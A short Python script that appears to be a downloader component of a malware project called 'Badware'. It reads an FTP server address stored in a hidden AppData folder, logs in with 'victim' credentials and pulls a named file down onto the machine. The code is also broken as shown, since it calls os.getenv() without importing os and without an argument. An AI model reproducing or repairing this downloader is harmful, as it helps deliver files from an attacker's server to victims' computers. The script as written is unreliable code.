import sys
import ftplib
username = os.getenv()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
session = ftplib.FTP(server,'victim','victimpass1234')
session.retrbinary(
    f"RETR {sys.argv[1]}", open(fr'C:\users\{username}\AppData\local\Aryan\Badware\{sys.argv[2]}{sys.argv[1]}', 'wb').write
)
session.quit()